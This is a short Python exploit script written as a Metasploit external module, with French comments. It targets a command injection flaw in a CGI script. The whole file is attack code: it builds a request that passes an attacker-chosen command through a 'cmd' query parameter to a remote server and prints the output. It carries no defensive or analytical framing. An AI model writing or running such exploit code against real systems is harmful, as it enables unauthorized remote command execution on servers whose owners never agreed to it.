#!/usr/bin/env python3
from metasploit import module
import requests
import subprocess

metadata = {
    'name': 'CGI Command Injection Exploit',
    'description': 'This module exploits a Command Injection vulnerability in a CGI script.',
    'author': 'Ngueyep Ulrich',
    'platform': 'linux',
    'arch': 'x86_64',
    'license': 'MSF_LICENSE',
}

def run(args):
    # Récupérer les paramètres du module
    target_url = args['RHOST']
    target_port = args['RPORT']
    target_script = args['TARGET_SCRIPT']
    payload = args['PAYLOAD']

    # URL complète pour accéder au script vulnérable
    target = f'http://{target_url}:{target_port}/{target_script}'

    # Création de la charge utile pour l'injection
    exploit_url = f'{target}?cmd={payload}'

    print(f"Envoi de la commande au serveur : {exploit_url}")

    # Envoi de la requête HTTP avec la commande injectée
    try:
        response = requests.get(exploit_url)
        if response.status_code == 200:
            print("Commande exécutée avec succès.")
            print("Réponse du serveur:")
            print(response.text)
        else:
            print(f"Erreur, le serveur a retourné un code {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de l'envoi de la requête : {str(e)}")

if __name__ == '__main__':
    module.run(metadata, run)
